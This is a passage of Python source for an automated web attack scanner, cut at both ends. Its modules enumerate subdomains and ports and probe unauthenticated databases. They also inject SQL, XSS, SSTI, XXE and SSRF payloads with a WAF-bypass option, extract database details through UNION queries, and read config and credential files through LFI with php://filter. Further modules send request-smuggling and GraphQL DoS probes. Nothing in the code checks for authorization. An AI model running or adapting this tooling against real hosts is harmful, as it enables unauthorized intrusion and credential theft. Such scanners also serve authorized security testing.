                name = name.strip().lstrip("*.")
                if name.endswith(job.host) and name != job.host:
                    found.add(name)
        for sub in list(found)[:20]:
            job.subdomains.append({"subdomain": sub, "source": "crt.sh"})
            job.log(f"Subdomain (crt.sh): {sub}", "WARN")
            job.add_vuln("Subdomain Found", sub,
                         evidence=f"Subdomain discovered via certificate transparency logs",
                         extracted={"source": "crt.sh"})
        if found:
            job.chain(f"crt.sh found {len(found)} subdomains — each is potential attack surface")
    except:
        pass


def _enum_subdomains_dns(job):
    """Brute-force common subdomain names via DNS resolution."""
    if not DNS_OK:
        return
    found = []
    def check(word):
        fqdn = f"{word}.{job.host}"
        try:
            socket.gethostbyname(fqdn)
            return fqdn
        except:
            return None
    with ThreadPoolExecutor(max_workers=20) as ex:
        for result in ex.map(check, SUBDOMAIN_WORDS):
            if result:
                found.append(result)
                job.subdomains.append({"subdomain": result, "source": "dns-brute"})
                job.log(f"Subdomain (DNS): {result}", "WARN")
                job.add_vuln("Subdomain Found", result,
                             evidence=f"DNS brute-force resolved: {result}",
                             extracted={"source": "dns-brute"})
    if found:
        job.chain(f"DNS brute-force found {len(found)} live subdomains")


# ══ PHASE 1: PORT SCAN + SERVICE CHAINS ══════════════════════════════════════
def probe_port(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.2)
        if s.connect_ex((host, port)) == 0:
            banner = ""
            try:
                if port in (80, 8080, 8000, 3000):
                    s.send(b"HEAD / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
                elif port == 25:
                    s.send(b"EHLO phantom.test\r\n")
                elif port == 21:
                    pass  # FTP sends banner on connect
                data = s.recv(256)
                banner = data.decode("utf-8", errors="ignore").strip()[:100]
            except:
                pass
            s.close()
            return {"port": port, "banner": banner}
        s.close()
    except:
        pass
    return None


def detect_service(port, banner):
    PM = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",
          143:"IMAP",443:"HTTPS",445:"SMB",1433:"MSSQL",3000:"Dev-App",3306:"MySQL",
          3389:"RDP",4000:"Dev-App",5000:"Dev-App",5432:"PostgreSQL",5672:"RabbitMQ",
          5900:"VNC",6379:"Redis",8000:"HTTP-Dev",8080:"HTTP-Alt",8081:"HTTP-Alt",
          8443:"HTTPS-Alt",8888:"Jupyter",9000:"PHP-FPM",9090:"Prometheus",
          9200:"Elasticsearch",9300:"Elastic-Node",10000:"Webmin",
          11211:"Memcached",27017:"MongoDB",50000:"DB2"}
    svc  = PM.get(port, f"Port-{port}")
    cves = []
    version = ""
    vm = re.search(r"[\w./]+[\d]+\.[\d.]+", banner)
    if vm:
        version = vm.group(0)[:40]
    for pattern, checks in VERSION_CVE.items():
        m = re.search(pattern, banner, re.IGNORECASE)
        if m:
            version = m.group(0)[:40]
            try:
                ver = tuple(int(x) for x in m.group(1).split(".")[:3])
                for threshold, desc in checks:
                    if ver < threshold:
                        cves.append(desc)
            except:
                pass
    return {"service": svc, "version": version, "cves": cves}


def phase_ports(job):
    job.set_phase("Phase 1: Port Scan", len(TOP_PORTS))
    job.log(f"Async scanning {len(TOP_PORTS)} ports on {job.host}...", "INFO")
    with ThreadPoolExecutor(max_workers=25) as ex:
        futs = {ex.submit(probe_port, job.host, p): p for p in TOP_PORTS}
        for fut in as_completed(futs):
            res = fut.result()
            if res:
                info  = detect_service(res["port"], res["banner"])
                entry = {**res, **info}
                with job._lock:
                    job.ports.append(entry)
                if res["port"] in DANGEROUS_PORTS:
                    job.log(f"DANGEROUS: {DANGEROUS_PORTS[res['port']]} on {res['port']}", "VULN")
                    job.add_vuln("Open Port (Dangerous)", f"{job.host}:{res['port']}",
                                 evidence=f"{info['service']} exposed — typically unauthenticated")
                else:
                    job.log(f"Open: {res['port']} ({info['service']}) {info['version'][:25]}", "OK")
                for cve in info["cves"]:
                    job.add_vuln("Outdated Service CVE", f"{job.host}:{res['port']}",
                                 evidence=f"{info['version']} — {cve}")
            job.advance("Phase 1: Port Scan")
    port_nums = [p["port"] for p in job.ports]
    if 6379 in port_nums:             _chain_redis(job)
    if 9200 in port_nums:             _chain_elasticsearch(job)
    if 27017 in port_nums:            _chain_mongodb(job)
    if 21 in port_nums:               _chain_ftp(job)
    if 11211 in port_nums:            _chain_memcached(job)
    # SSL deep analysis on HTTPS ports
    for p in port_nums:
        if p in (443, 8443, 465, 993, 995):
            _ssl_deep_analysis(job, p)
            break


def _chain_redis(job):
    try:
        s = socket.socket(); s.settimeout(3); s.connect((job.host, 6379))
        s.send(b"INFO server\r\n")
        data = s.recv(1024).decode("utf-8", errors="ignore"); s.close()
        if "redis_version" in data:
            vm = re.search(r"redis_version:(.+)", data)
            ver = vm.group(1).strip() if vm else "?"
            job.chain(f"Redis unauth — v{ver} — all keys readable without credentials")
            job.add_vuln("Unauthenticated Redis", f"redis://{job.host}:6379",
                         evidence=f"INFO server returned without auth — version {ver}",
                         chain_type="OPEN_REDIS")
    except:
        pass


def _chain_elasticsearch(job):
    for port in (9200, 9201):
        try:
            r = requests.get(f"http://{job.host}:{port}/_cat/indices?v",
                             timeout=4, verify=False)
            if r.status_code == 200 and ("green" in r.text or "yellow" in r.text):
                job.chain(f"Elasticsearch indices listed on port {port} without auth")
                job.add_vuln("Unauthenticated Elasticsearch",
                             f"http://{job.host}:{port}",
                             evidence="/_cat/indices returned data — no credentials required")
                return
        except:
            pass


def _chain_mongodb(job):
    try:
        s = socket.socket(); s.settimeout(3); s.connect((job.host, 27017))
        probe = (b"\x41\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00"
                 b"\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\x01\x00\x00\x00"
                 b"\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00")
        s.send(probe); data = s.recv(512); s.close()
        if len(data) > 20:
            job.chain("MongoDB responded without authentication — collections accessible")
            job.add_vuln("Unauthenticated MongoDB", f"mongodb://{job.host}:27017",
                         evidence="Wire protocol response without credentials")
    except:
        pass


def _chain_ftp(job):
    try:
        s = socket.socket(); s.settimeout(4); s.connect((job.host, 21))
        banner = s.recv(256).decode("utf-8", errors="ignore")
        s.send(b"USER anonymous\r\n"); time.sleep(0.3); s.recv(256)
        s.send(b"PASS anon@phantom.test\r\n"); time.sleep(0.3)
        resp = s.recv(256).decode("utf-8", errors="ignore"); s.close()
        if "230" in resp:
            job.chain("FTP anonymous login accepted — files readable without credentials")
            job.add_vuln("FTP Anonymous Login", f"ftp://{job.host}:21",
                         evidence=f"Anonymous FTP login OK. Banner: {banner[:60]}")
    except:
        pass


def _chain_memcached(job):
    try:
        s = socket.socket(); s.settimeout(3); s.connect((job.host, 11211))
        s.send(b"stats\r\n")
        data = s.recv(1024).decode("utf-8", errors="ignore"); s.close()
        if "STAT " in data:
            vm = re.search(r"STAT version (.+)", data)
            ver = vm.group(1).strip() if vm else "?"
            job.chain(f"Memcached stats accessible without auth — v{ver}")
            job.add_vuln("Open Port (Dangerous)", f"{job.host}:11211",
                         evidence=f"Memcached stats returned without auth — v{ver}")
    except:
        pass


def _ssl_deep_analysis(job, port=443):
    """Deep SSL/TLS analysis — protocols, ciphers, cert validity, known weaknesses."""
    job.log(f"SSL/TLS deep analysis on port {port}...", "INFO")
    result = {"port": port, "issues": []}
    host   = job.host

    # Check weak protocols
    for proto in [ssl.PROTOCOL_SSLv23]:
        for weak_ver, label in [(ssl.OP_NO_SSLv2, "SSLv2"), (ssl.OP_NO_SSLv3, "SSLv3"),
                                 (ssl.OP_NO_TLSv1, "TLS 1.0"), (ssl.OP_NO_TLSv1_1, "TLS 1.1")]:
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                with ctx.wrap_socket(socket.create_connection((host, port), timeout=5),
                                     server_hostname=host) as s:
                    ver = s.version()
                    job.log(f"TLS Version: {ver}", "OK")
                    if ver in ("TLSv1", "TLSv1.1", "SSLv3"):
                        job.add_vuln("SSL/TLS Weakness", f"{host}:{port}",
                                     evidence=f"Deprecated {ver} accepted — POODLE/BEAST risk")
                        result["issues"].append(f"Weak protocol: {ver}")
                    # Check cipher suite
                    cipher = s.cipher()
                    if cipher:
                        cipher_name = cipher[0]
                        for weak in ["RC4", "DES", "3DES", "EXPORT", "NULL", "ANON"]:
                            if weak in cipher_name.upper():
                                job.add_vuln("SSL/TLS Weakness", f"{host}:{port}",
                                             evidence=f"Weak cipher negotiated: {cipher_name}")
                                result["issues"].append(f"Weak cipher: {cipher_name}")
                    # Cert details
                    cert = s.getpeercert()
                    if cert:
                        exp_str = cert.get("notAfter", "")
                        try:
                            exp_date = datetime.strptime(exp_str, "%b %d %H:%M:%S %Y %Z")
                            days     = (exp_date - datetime.utcnow()).days
                            if days < 0:
                                job.add_vuln("SSL/TLS Weakness", f"{host}:{port}",
                                             evidence=f"Certificate EXPIRED {abs(days)} days ago!")
                            elif days < 14:
                                job.log(f"Cert expires in {days} days — urgent renewal!", "WARN")
                            else:
                                job.log(f"Cert valid {days} days remaining", "OK")
                            result["days_left"] = days
                        except:
                            pass
                        subj = dict(x[0] for x in cert.get("subject", []))
                        job.log(f"Cert CN: {subj.get('commonName', 'N/A')}", "OK")
                    break
            except ssl.SSLError:
                pass
            except Exception:
                pass

    # Check HTTP→HTTPS redirect
    try:
        http_url = job.url.replace("https://", "http://")
        r = requests.get(http_url, timeout=5, verify=False, allow_redirects=False)
        if r.status_code == 200:
            job.add_vuln("SSL/TLS Weakness", job.url,
                         evidence="HTTP version accessible without HTTPS redirect — no HSTS enforcement")
        elif r.status_code in (301, 302, 307, 308):
            loc = r.headers.get("Location", "")
            if "https://" in loc:
                job.log("HTTP → HTTPS redirect configured", "OK")
    except:
        pass

    job.ssl_info = result


# ══ PHASE 2: RECURSIVE SPIDER + JS ANALYSIS ══════════════════════════════════
JS_EP_PATTERNS = [
    r"""fetch\s*\(\s*['"`]([^'"`]+)['"`]""",
    r"""axios\.\w+\s*\(\s*['"`]([^'"`]+)['"`]""",
    r"""(?:url|endpoint|path|href)\s*[=:]\s*['"`]([/][^'"`\s]{3,})['"`]""",
    r"""ws[s]?://[^'"`\s]+""",
    r"""(?:baseURL|API_URL|BASE_URL)\s*[=:]\s*['"`](https?://[^'"`\s]+)['"`]""",
    r"""/api/v?\d*/[\w/{}\-]+""",
]


def _parse_js(job, js, source):
    base_d = urlparse(job.url).netloc
    for pat in JS_EP_PATTERNS:
        for m in re.finditer(pat, js):
            path = m.group(1) if m.lastindex else m.group(0)
            if path.startswith("/"):
                full = urljoin(job.url, path)
            elif path.startswith(("http", "ws")):
                full = path
            else:
                continue
            if urlparse(full).netloc in ("", base_d):
                job.urls.add(full)
    for kt, pattern in JS_SECRETS.items():
        for m in re.finditer(pattern, js):
            val = m.group(0)[:100]
            if not any(val == s.get("value", "")[:100] for s in job.secrets):
                sev = SECRET_SEV.get(kt, "HIGH")
                with job._lock:
                    job.secrets.append({"type": kt, "value": val, "source": source, "severity": sev})
                job.log(f"SECRET [{sev}]: {kt} — {val[:40]}...", "VULN")
                job.add_vuln("API Key Exposed", source,
                             evidence=f"{kt}: {val[:40]}...",
                             extracted={"key_type": kt, "severity": sev})
    # Check for DOM XSS sinks
    dom_sinks = ["innerHTML", "document.write", "eval(", "setTimeout(", "setInterval(",
                 "location.href", "location.replace", "document.domain"]
    for sink in dom_sinks:
        if sink in js and ("location.search" in js or "location.hash" in js or
                           "URLSearchParams" in js or "location.href" in js):
            job.log(f"Potential DOM XSS sink: {sink} with user-controlled input", "WARN")


def _crawl(job, url, depth=0):
    if depth > DEPTH or len(job.urls) >= MAXURLS or url in job.urls:
        return
    job.urls.add(url)
    resp = job.req(url)
    if not resp:
        return
    soup = BeautifulSoup(resp.text, "html.parser")
    base_d = urlparse(job.url).netloc

    for tag, attr in [("a","href"),("form","action"),("script","src"),
                       ("link","href"),("iframe","src")]:
        for el in soup.find_all(tag):
            raw = el.get(attr, "")
            if not raw or raw.startswith(("mailto:", "tel:", "#", "javascript:")):
                continue
            full  = urljoin(url, raw)
            p     = urlparse(full)
            if p.netloc != base_d:
                continue
            clean = p._replace(fragment="").geturl()
            if tag == "script" and attr == "src":
                job.js_files.add(clean)
            if clean not in job.urls and len(job.urls) < MAXURLS:
                _crawl(job, clean, depth + 1)

    for sc in soup.find_all("script"):
        _parse_js(job, sc.string or "", url)

    for form in soup.find_all("form"):
        action = urljoin(url, form.get("action", url))
        method = form.get("method", "get").upper()
        inputs = {i.get("name"): i.get("value", "")
                  for i in form.find_all(["input","textarea","select"])
                  if i.get("name")}
        if inputs:
            entry = {"action": action, "method": method, "inputs": inputs}
            if entry not in job.forms:
                with job._lock:
                    job.forms.append(entry)

    import bs4
    for c in soup.find_all(string=lambda t: isinstance(t, bs4.Comment)):
        for p2 in re.findall(r"(/[a-zA-Z0-9_\-/]{3,})", str(c)):
            job.urls.add(urljoin(url, p2))
        if any(kw in str(c).lower() for kw in ["password","secret","api","todo","debug","hack"]):
            job.add_vuln("Info Disclosure", url,
                         evidence=f"Sensitive HTML comment: {str(c)[:80]}")


def phase_spider(job):
    job.set_phase("Phase 2: Spider & JS", 5)
    r = job.req(urljoin(job.url, "/robots.txt"))
    if r and r.status_code == 200:
        for line in r.text.splitlines():
            if line.lower().startswith("disallow:"):
                p = line.split(":", 1)[1].strip()
                if p and p != "/":
                    job.urls.add(urljoin(job.url, p))
        job.log(f"robots.txt: {r.text.count('Disallow')} entries added", "OK")
    job.advance("Phase 2: Spider & JS")

    r = job.req(urljoin(job.url, "/sitemap.xml"))
    if r and r.status_code == 200:
        for m in re.finditer(r"<loc>(.*?)</loc>", r.text):
            if urlparse(m.group(1)).netloc == job.host:
                job.urls.add(m.group(1).strip())
    job.advance("Phase 2: Spider & JS")

    _crawl(job, job.url)
    job.advance("Phase 2: Spider & JS")

    for js_url in list(job.js_files)[:20]:
        r = job.req(js_url)
        if r and r.status_code == 200:
            _parse_js(job, r.text, js_url)
    job.advance("Phase 2: Spider & JS")

    job.log(f"Spider: {len(job.urls)} URLs | {len(job.forms)} forms | {len(job.js_files)} JS | {len(job.secrets)} secrets", "OK")
    job.advance("Phase 2: Spider & JS")


# ══ PHASE 3: ALL VULNERABILITY MODULES ═══════════════════════════════════════

# ── Helper: SQLi data extraction ─────────────────────────────────────────────
def _sqli_extract(job, url, param, params):
    for cols in range(1, 5):
        for label, expr in [("version","version()"),("db","database()"),("user","user()")]:
            pfx = "NULL," * (cols - 1)
            tp  = params.copy()
            tp[param] = f"' UNION SELECT {pfx}{expr}--"
            r = job.req(url, params=tp)
            if not r:
                continue
            vm = re.search(r"\b(\d+\.\d+[.\d\-\w]+)\b", r.text)
            if vm:
                val = vm.group(1)
                job.chain(f"SQLi data extracted — {label}: {val}")
                return {label: val}
        if True:
            break
    return {}


# ── Module A: Smart SQL Injection ─────────────────────────────────────────────
def mod_sqli(job, url):
    parsed = urlparse(url)
    if not parsed.query:
        return
    params = dict(parse_qsl(parsed.query))
    use_bypass = bool(job.waf_info.get("waf"))

    for param, value in params.items():
        ptype = FUZZER.detect_type(param, value)
        payloads = FUZZER.get_sqli(ptype) + SQL_PAYLOADS[:12] + FUZZER.mutate(value)

        for payload in payloads:
            tp = params.copy(); tp[param] = payload
            r  = job.req(url, params=tp, waf_bypass=use_bypass)
            if not r:
                continue
            for err in SQL_ERRORS:
                if re.search(err, r.text.lower(), re.IGNORECASE):
                    ext = _sqli_extract(job, url, param, params)
                    job.add_vuln("SQL Injection", url, param=param, payload=payload,
                                 evidence=f"SQL error detected (param type: {ptype})",
                                 extracted=ext, chain_type="SQLI")
                    return

            # Time-based blind
            if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
                t0 = time.time()
                job.req(url, params={**params, param: payload})
                if time.time() - t0 > 3.0:
                    job.add_vuln("SQL Injection", url, param=param, payload=payload,
                                 evidence=f"Time-based blind SQLi — response delayed >3s")
                    return

        # NoSQL injection attempt
        for payload in FUZZER.NOSQL:
            tp = params.copy(); tp[param] = payload
            r  = job.req(url, params=tp)
            if r and r.status_code == 200 and "error" not in r.text.lower():
                job.add_vuln("SQL Injection", url, param=param, payload=payload,
                             evidence=f"NoSQL injection — operator not rejected: {payload}")
                return

        # Prototype pollution
        for payload in FUZZER.PROTO:
            tp = params.copy(); tp[param] = payload
            r  = job.req(url, params=tp)
            if r and "polluted" in r.text:
                job.add_vuln("Proto Pollution", url, param=param, payload=payload,
                             evidence="Prototype pollution — 'polluted' key appeared in response")
                return


def mod_sqli_forms(job):
    for form in job.forms:
        for field, val in form["inputs"].items():
            ptype    = FUZZER.detect_type(field, val)
            payloads = FUZZER.get_sqli(ptype) + SQL_PAYLOADS[:10]
            for payload in payloads:
                data = dict(form["inputs"]); data[field] = payload
                r = (job.req(form["action"], method="POST", data=data)
                     if form["method"] == "POST"
                     else job.req(form["action"], params=data))
                if r:
                    for err in SQL_ERRORS:
                        if re.search(err, r.text.lower(), re.IGNORECASE):
                            job.add_vuln("SQL Injection (Form)", form["action"],
                                         param=field, payload=payload,
                                         evidence="SQL error in form submission")
                            return


# ── Module B: Smart XSS ───────────────────────────────────────────────────────
def mod_xss(job, url):
    parsed = urlparse(url)
    if not parsed.query:
        return
    params     = dict(parse_qsl(parsed.query))
    use_bypass = bool(job.waf_info.get("waf"))

    for param, value in params.items():
        ptype    = FUZZER.detect_type(param, value)
        payloads = FUZZER.get_xss(ptype) + XSS_PAYLOADS[:8] + FUZZER.SSTI

        for payload in payloads:
            tp = params.copy(); tp[param] = payload
            r  = job.req(url, params=tp, waf_bypass=use_bypass)
            if r and payload in r.text:
                if payload in ("{{7*7}}", "${7*7}", "#{7*7}") and "49" in r.text:
                    job.add_vuln("SSTI", url, param=param, payload=payload,
                                 evidence="Template expression 7*7=49 executed — RCE possible",
                                 chain_type="SSTI_CONFIRMED")
                else:
                    job.add_vuln("Reflected XSS", url, param=param, payload=payload,
                                 evidence=f"Payload reflected verbatim (param type: {ptype})")
                return


def mod_xss_forms(job):
    for form in job.forms:
        for field, val in form["inputs"].items():
            ptype = FUZZER.detect_type(field, val)
            for payload in FUZZER.get_xss(ptype) + XSS_PAYLOADS[:6]:
                data = dict(form["inputs"]); data[field] = payload
                r = (job.req(form["action"], method="POST", data=data)
                     if form["method"] == "POST"
                     else job.req(form["action"], params=data))
                if r and payload in r.text:
                    job.add_vuln("Reflected XSS (Form)", form["action"],
                                 param=field, payload=payload,
                                 evidence="XSS payload reflected in form response")
                    return


# ── Module C: LFI + php://filter chain ───────────────────────────────────────
def mod_lfi(job, url):
    params = dict(parse_qsl(urlparse(url).query))
    fp     = {k: v for k, v in params.items()
               if any(kw in k.lower() for kw in LFI_PARAMS)}
    for param in fp:
        for payload in LFI_PAYLOADS:
            tp = params.copy(); tp[param] = payload
            r  = job.req(url, params=tp)
            if r and any(ind in r.text for ind in LFI_INDICATORS):
                excerpt = r.text[:200] if "root:x:" in r.text else ""
                job.add_vuln("LFI", url, param=param, payload=payload,
                             evidence="File inclusion confirmed",
                             extracted={"excerpt": excerpt},
                             chain_type="LFI_CONFIRMED")
                for cfg in ["config.php","wp-config.php",".env","settings.py","application.yml"]:
                    tp2 = params.copy()
                    tp2[param] = f"php://filter/convert.base64-encode/resource={cfg}"
                    r2 = job.req(url, params=tp2)
                    if r2 and len(r2.text) > 30:
                        try:
                            b64 = re.search(r"[A-Za-z0-9+/=]{20,}", r2.text)
                            if b64:
                                dec = base64.b64decode(b64.group(0)).decode("utf-8", errors="ignore")
                                if any(kw in dec.lower() for kw in
                                       ["password","secret","define(","DB_","KEY"]):
                                    job.chain(f"php://filter read {cfg} — credentials in source!")
                                    job.add_vuln("LFI Config Read", url, param=param,
                                                 payload=tp2[param],
                                                 evidence=f"php://filter decoded {cfg} — secrets present",
                                                 extracted={"preview": dec[:200]})
                        except:
                            pass
                return


# ── Module D: SSRF ────────────────────────────────────────────────────────────
def mod_ssrf(job, url):
    params = dict(parse_qsl(urlparse(url).query))
    sp     = {k: v for k, v in params.items() if k.lower() in SSRF_PARAMS}
    for param in sp:
        for ssrf_url in SSRF_PAYLOADS:
            tp = params.copy(); tp[param] = ssrf_url
            t0 = time.time()
            r  = job.req(url, params=tp)
            if not r:
                continue
            if any(ind in r.text for ind in ["ami-id","instance-id","computeMetadata","iam/","root:x:"]):
                job.add_vuln("SSRF", url, param=param, payload=ssrf_url,
                             evidence=f"SSRF to {ssrf_url} — cloud metadata returned!")
                return
            if time.time() - t0 > 3.5 and "169.254" in ssrf_url:
                job.add_vuln("SSRF", url, param=param, payload=ssrf_url,
                             evidence="Blind SSRF — response delayed on cloud metadata URL")
                return


# ── Module E: XXE Injection ───────────────────────────────────────────────────
def mod_xxe(job, url):
    """Test XML-consuming endpoints for External Entity injection."""
    # Look for XML endpoints from discovered URLs
    xml_urls = [u for u in job.urls if any(x in u.lower() for x in
                ["/xml", "/soap", "/api", "/upload", "/import", "/feed", "/rss"])]
    xml_urls.append(url)

    for target in xml_urls[:5]:
        for payload in XXE_PAYLOADS:
            try:
                r = requests.post(target, data=payload,
                                  headers={"Content-Type":"application/xml",
                                           "User-Agent": UAS[0]},
                                  timeout=TIMEOUT, verify=False)
                if r and any(ind in r.text for ind in XXE_INDICATORS):
                    job.add_vuln("XXE Injection", target,
                                 payload=payload[:80],
                                 evidence=f"XXE confirmed — server file content in response",
                                 extracted={"indicator": next(i for i in XXE_INDICATORS if i in r.text)})
                    job.chain("XXE confirmed — can read /etc/passwd and make internal requests")
                    return
            except:
                pass


# ── Module F: HTTP Request Smuggling ─────────────────────────────────────────
def mod_request_smuggling(job, url):
    """Detect CL.TE and TE.CL request smuggling via timing analysis."""
    parsed = urlparse(url)
    host   = parsed.netloc
    port   = 443 if parsed.scheme == "https" else 80

    # CL.TE: send Content-Length that mismatches Transfer-Encoding
    cl_te_request = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n\r\n"
        f"0\r\n\r\n"
        f"X"
    ).encode()

    try:
        s = socket.create_connection((parsed.hostname, port), timeout=5)
        if parsed.scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=parsed.hostname)

        t0 = time.time()
        s.sendall(cl_te_request)
        s.settimeout(6)
        try:
            resp = s.recv(1024).decode("utf-8", errors="ignore")
            elapsed = time.time() - t0
            if elapsed > 5.0 or "400" in resp[:15]:
                job.add_vuln("HTTP Request Smuggling", url,
                             payload="CL.TE desync probe",
                             evidence=f"Possible CL.TE smuggling — server delayed {elapsed:.1f}s or returned 400")
                job.chain("HTTP Request Smuggling candidate — manual verification recommended")
        except socket.timeout:
            job.add_vuln("HTTP Request Smuggling", url,
                         payload="CL.TE desync probe",
                         evidence="CL.TE probe caused timeout — server may be vulnerable to request smuggling")
        s.close()
    except Exception:
        pass


# ── Module G: GraphQL Security ────────────────────────────────────────────────
def mod_graphql(job):
    """Test GraphQL endpoints for introspection, DoS, and auth bypass."""
    gql_endpoints = ["/graphql", "/graphiql", "/api/graphql", "/v1/graphql",
                     "/query", "/gql"]
    for ep in gql_endpoints:
        target = job.url + ep
        r = job.req(target)
        if not r or r.status_code not in (200, 400, 405):
            continue

        # Test introspection
        try:
            r2 = requests.post(target,
                               json={"query": GRAPHQL_INTRO},
                               headers={"Content-Type":"application/json","User-Agent":UAS[0]},
                               timeout=TIMEOUT, verify=False)
            if r2.status_code == 200 and "__schema" in r2.text:
                types = len(re.findall(r'"name":"[A-Z][a-zA-Z]+"', r2.text))
                job.add_vuln("GraphQL Introspection", target,
                             payload=GRAPHQL_INTRO[:60],
                             evidence=f"Introspection enabled — {types} types exposed. Full schema accessible.",
                             extracted={"types_count": types})
                job.chain(f"GraphQL schema fully exposed — {types} types enumerable for targeted attacks")

            # Test deeply nested query (DoS potential)
            r3 = requests.post(target,
                               json={"query": GRAPHQL_DEEP},
                               headers={"Content-Type":"application/json","User-Agent":UAS[0]},
                               timeout=8, verify=False)
            if r3 and r3.status_code == 200 and r3.elapsed.total_seconds() > 2.0:
                job.add_vuln("GraphQL DoS", target,
                             payload=GRAPHQL_DEEP[:60],
                             evidence=f"Deep nested query took {r3.elapsed.total_seconds():.1f}s — no depth limiting")

            # Batch query abuse
            batch = [{"query": "{__typename}"}] * 50
            r4 = requests.post(target, json=batch,
                               headers={"Content-Type":"application/json","User-Agent":UAS[0]},
                               timeout=TIMEOUT, verify=False)
            if r4 and r4.status_code == 200 and "data" in r4.text:
                job.add_vuln("GraphQL DoS", target,
                             payload="Batch query x50",
                             evidence="Batch queries accepted without rate limiting — DoS risk")
        except:
            pass


# ── Module H: HTTP Parameter Pollution ───────────────────────────────────────
def mod_hpp(job, url):
    """Test duplicate parameters for WAF bypass and logic confusion."""
    parsed = urlparse(url)
    if not parsed.query:
        return
    params = dict(parse_qsl(parsed.query))

    for param, value in params.items():
        # Send same param twice with XSS in second
        test_url = url + f"&{param}=<script>alert(1)</script>"
        r = job.req(test_url)
        if r and "<script>alert(1)</script>" in r.text:
            job.add_vuln("HTTP Parameter Pollution", url,
                         param=param,
                         payload=f"{param}={value}&{param}=<script>alert(1)</script>",
                         evidence="Second duplicate parameter reflected — WAF bypassed via HPP")
            return

        # Test HPP for logic confusion (numeric)
        if value.isdigit():
            test_url2 = url + f"&{param}=0"
            r2 = job.req(test_url2)
            if r2 and r2.status_code == 200:
                if abs(len(r2.text) - (lambda r3: len(r3.text) if r3 else 0)(job.req(url))) > 100:
                    job.add_vuln("HTTP Parameter Pollution", url,
                                 param=param,
                                 payload=f"{param}={value}&{param}=0",
                                 evidence="Duplicate numeric parameter changed response — logic confusion possible")
                    return


# ── Module I: Business Logic Flaws ───────────────────────────────────────────
def mod_business_logic(job, url):
    """Detect business logic flaws: negative values, zero price, int overflow."""
    parsed = urlparse(url)
    if not parsed.query:
        return
    params = dict(parse_qsl(parsed.query))

    for param, value in params.items():
        ptype = FUZZER.detect_type(param, value)

        if ptype in ("integer", "pagination"):
            for bval in FUZZER.get_boundary(ptype):
                tp = params.copy(); tp[param] = bval
                r  = job.req(url, params=tp)
                if not r:
                    continue
                # Negative quantities accepted
                if bval in ("-1", "-2147483648") and r.status_code == 200:
                    body_l = r.text.lower()
                    if any(kw in body_l for kw in ["cart","order","total","price","quantity","amount"]):
                        job.add_vuln("Business Logic Flaw", url, param=param, payload=bval,
                                     evidence=f"Negative value {bval} accepted in business context — price manipulation possible")
                        return
                # Stack trace on boundary
                if r.status_code == 500:
                    job.add_vuln("Stack Trace Leaked", url, param=param, payload=bval,
                                 evidence=f"HTTP 500 on boundary value {bval} — exception not handled")
                if "traceback" in r.text.lower() or "stack trace" in r.text.lower():
                    job.add_vuln("Stack Trace Leaked", url, param=param, payload=bval,
                                 evidence="Framework stack trace leaked in response")
                    return

        # Mass assignment test via POST
        if param.lower() in ("role","admin","is_admin","privilege","level","type","rank"):
            tp = params.copy(); tp[param] = "admin"
            r  = job.req(url, params=tp)
            if r and "admin" in r.text.lower() and r.status_code == 200:
                job.add_vuln("Business Logic Flaw", url, param=param, payload=f"{param}=admin",
                             evidence="Privilege escalation via URL parameter — role set to admin without auth")
                return


# ── Module J: Web Cache Poisoning ─────────────────────────────────────────────
def mod_cache_poison(job, url):
    """Test unkeyed headers for cache poisoning."""
    for hdr, val in CACHE_HEADERS:
        try:
            r = requests.get(url, headers={hdr: val, "User-Agent": UAS[0],
                                           "Cache-Control": "no-cache"},
                             timeout=TIMEOUT, verify=False)
            if not r:
                continue
            # Check if injected value reflected in response
            if val in r.text or val in str(r.headers):
                cache_ctrl = r.headers.get("Cache-Control", "")
                cache_age  = r.headers.get("Age", "")
                age_val    = r.headers.get("X-Cache", "")
                if "public" in cache_ctrl or cache_age or "hit" in age_val.lower():
                    job.add_vuln("Web Cache Poisoning", url,
                                 payload=f"{hdr}: {val}",
                                 evidence=f"Header '{hdr}' reflected + response is cacheable — cache poisoning possible")
                    job.chain(f"Cache poisoning via {hdr} — poisoned response could serve to all users")
                    return
                elif val in r.text:
                    job.log(f"Cache poison candidate: {hdr} reflected but may not be cached", "WARN")
        except:
            pass


# ── Module K: OAuth / Auth Flow Testing ──────────────────────────────────────
def mod_oauth(job):
    """Detect OAuth/authentication flow misconfigurations."""
    oauth_paths = ["/oauth/authorize", "/oauth2/authorize", "/auth/oauth",
                   "/connect/authorize", "/openid/connect", "/.well-known/openid-configuration",
                   "/oauth/token", "/login/oauth/authorize"]
    for path in oauth_paths:
        r = job.req(job.url + path)
        if not r or r.status_code not in (200, 302, 400):
            continue

        job.log(f"OAuth endpoint found: {path}", "WARN")

        # Test missing state parameter (CSRF on OAuth)
        if "redirect_uri" in r.text or "response_type" in r.text:
            test_url = (f"{job.url}{path}?response_type=code&client_id=test"
                        f"&redirect_uri=https://evil-phantom-test.com&scope=openid")
            r2 = job.req(test_url, allow_redirects=False)
            if r2 and r2.status_code in (301, 302):
                loc = r2.headers.get("Location", "")
                if "evil-phantom-test.com" in loc:
                    job.add_vuln("OAuth Misconfiguration", job.url + path,
                                 payload="redirect_uri=https://evil-phantom-test.com",
                                 evidence="redirect_uri not validated — OAuth token theft via open redirect")
                    job.chain("OAuth redirect_uri bypass — authorization codes can be stolen")
                    return
                if "state=" not in test_url and "state" not in loc:
                    job.add_vuln("OAuth Misconfiguration", job.url + path,
                                 evidence="No state parameter required — CSRF on OAuth login flow possible")


# ── Module L: CMS Deep Scanning ───────────────────────────────────────────────
def mod_cms_deep(job):
